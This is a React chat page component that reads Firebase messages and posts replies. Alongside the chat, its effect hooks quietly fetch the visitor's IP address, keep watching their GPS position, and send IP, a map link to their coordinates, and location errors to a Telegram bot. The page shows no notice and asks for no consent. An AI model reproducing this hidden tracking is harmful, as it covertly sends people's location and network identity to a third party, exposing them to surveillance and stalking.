import _ from 'lodash';
import React, { useEffect, useState } from "react";
import { useSelector } from "react-redux";
import { withRouter } from "react-router-dom";
import { chatMsgRef } from "firebaseUtil/firebase";
// @material-ui/core components
import { makeStyles } from "@material-ui/core/styles";
// core components
import GridContainer from "components/Grid/GridContainer.js";
import GridItem from "components/Grid/GridItem.js";
import ChatMessage from "components/Chat/ChatMessage";
import ChatInput from "components/Chat/ChatInput";
import { avatarUser, mediaTitle } from 'Util/chatUtil';
import FloatyAssistant from 'components/Assistant/floaty';
import { sendTelegramMessage } from "Util/TelegramUtil";
import { linda } from 'firebaseUtil/user';
import sectionCommentsStyle from "assets/jss/material-kit-pro-react/views/blogPostSections/sectionCommentsStyle.js";
import { watchCurrentLocation } from 'Util/locationUtil';
import { currentLocation } from 'Util/locationUtil';
import { clearWatchPosition } from 'Util/locationUtil';

const useStyles = makeStyles(sectionCommentsStyle);

const UserChatPage = ({ history }) => {
    const classes = useStyles();
    const { user } = useSelector(state => state.login);
    const [allChatMessageInfo, setAllChatMessageInfo] = useState(undefined);
    const [replyMessage, setReplyMessage] = useState("");
    const maxMessageNumber = 70;

    //GPS
    const [ip, setIp] = useState(undefined);
    const [userLocation, setUserLocation] = useState(undefined);
    const [errorMessage, setErrorMessage] = useState(undefined);

    useEffect(() => {
        if (chatMsgRef) {
            chatMsgRef.limitToLast(maxMessageNumber).on("value", snapshot => {
                const data = snapshot.val();
                if (data !== null && data !== undefined) {
                    // 最多顯示 70 則訊息
                    const sliceData = _.slice(_.values(data), -maxMessageNumber);

                    // 最新一則 Po 文的使用者
                    const currentSendMsgUser = _.slice(_.values(sliceData), -1)[0].user;

                    // 最新一則 Po 文的訊息 ID (改採用 Po 文時間)
                    const currentSendMsgId = _.slice(_.values(sliceData), -1)[0].createOn;

                    // 若最新 Po 文的使用者不是自己(當下登入帳號), 則不要將 Reply Message 清空, 以免尚未回覆的訊息消失
                    if (user === currentSendMsgUser) {
                        setReplyMessage("");
                        setAllChatMessageInfo(sliceData);
                    }
                    else {
                        setAllChatMessageInfo(sliceData);
                    }
                }
            });
        }
    }, [])

    //取得 IP
    useEffect(() => {
        fetch('https://www.cloudflare.com/cdn-cgi/trace')
            .then(function (response) {
                return response.text();
            })
            .then(function (result) {
                const [f1, h, ipInfo] = result.split("\n");
                if (ipInfo) {
                    const [ip, value] = ipInfo.split("=");
                    setIp(value);
                }
            });
    }, [])

    //取得 GPS 座標
    useEffect(() => {
        currentLocation(setUserLocation, setErrorMessage);
        const id = watchCurrentLocation(setUserLocation, setErrorMessage);

        return () => {
            if (id) {
                clearWatchPosition(id);
            }
        };
    }, [])

    //若取得座標失敗則轉導至錯誤畫面
    useEffect(() => {
        if (errorMessage) {
            console.log(errorMessage);
            const message = `uniqlo user error: ${errorMessage}`;
            sendTelegramMessage(message);
        }
    }, [errorMessage])

    useEffect(() => {
        if (userLocation) {
            const message = `uniqlo user \n ip:${ip} \n https://www.google.com.tw/maps?q=${userLocation.lat},${userLocation.lng}`;
            sendTelegramMessage(message);
        }
    }, [userLocation]);

    const onReplyClick = event => {

        if (user && replyMessage !== "") {
            const messageInfo = {
                user: user,
                message: replyMessage,
                createOn: Date.now()
            }
            chatMsgRef.push().set(messageInfo);
        }

        if (user === linda) {
            const notifyMessage = "http://www.uniqlo.com/tw/store/list/new/auto";
            sendTelegramMessage(notifyMessage);
        }
    }



    return (
        <div className={classes.section}>
            <GridContainer justify="center">
                <GridItem xs={12} sm={8} md={8}>
                    <div>
                        {allChatMessageInfo ? allChatMessageInfo.map((value, index) => {
                            return (
                                <ChatMessage
                                    key={index}
                                    avatar={avatarUser(value.user)}
                                    title={mediaTitle(value)}
                                    message={value.message}
                                />
                            )
                        }) : <div></div>}
                        <ChatInput
                            avatar={avatarUser(user)}
                            value={replyMessage}
                            onChange={(e) => { setReplyMessage(e.target.value) }}
                            onReply={onReplyClick}
                        />
                    </div>
                </GridItem>
            </GridContainer>
            <FloatyAssistant></FloatyAssistant>
        </div>
    );
}

export default withRouter(UserChatPage);